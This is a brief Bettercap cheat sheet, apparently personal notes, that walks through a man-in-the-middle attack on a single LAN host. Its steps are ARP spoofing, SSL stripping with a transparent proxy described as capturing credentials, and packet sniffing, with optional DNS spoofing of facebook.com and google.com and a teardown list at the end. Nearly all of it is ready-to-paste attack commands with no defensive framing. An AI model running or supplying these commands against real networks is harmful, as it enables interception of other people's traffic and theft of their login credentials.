# Bettercap
## Target Set On

# 1. Network discovery
net.probe on

# 2. Set ARP spoofing target
set arp.spoof.targets 192.168.1.105

# 3. Enable full duplex ARP spoofing
set arp.spoof.fullduplex true

# 4. Enable ARP spoofing
arp.spoof on

# 5. Enable HTTPS stripping (SSLStrip/SSLStrip+)
set http.proxy.sslstrip true
http.proxy on

# 6. Enable transparent HTTP proxy
set http.proxy.transparent true

# 7. Configure HTTP proxy to capture credentials
set http.proxy.injectjs false  # Disable JS injection for cleaner attack
set http.proxy.port 8080

# 8. (Optional) Enable HTTPS proxy for SSL inspection
# Note: Requires installing cert on target
# https.proxy on
# set https.proxy.port 8443

# 9. Enable packet sniffing
set net.sniff.local true
set net.sniff.verbose true
net.sniff on

# 10. (Optional) DNS spoofing for additional redirection
# set dns.spoof.domains facebook.com,google.com
# set dns.spoof.address 192.168.1.1
# dns.spoof on



## Off Beetercap
 In bettercap console paste all these:
 arp.spoof off
 http.proxy off
 https.proxy off
 net.sniff off
 net.probe off
 ticker off
 clear
 quit
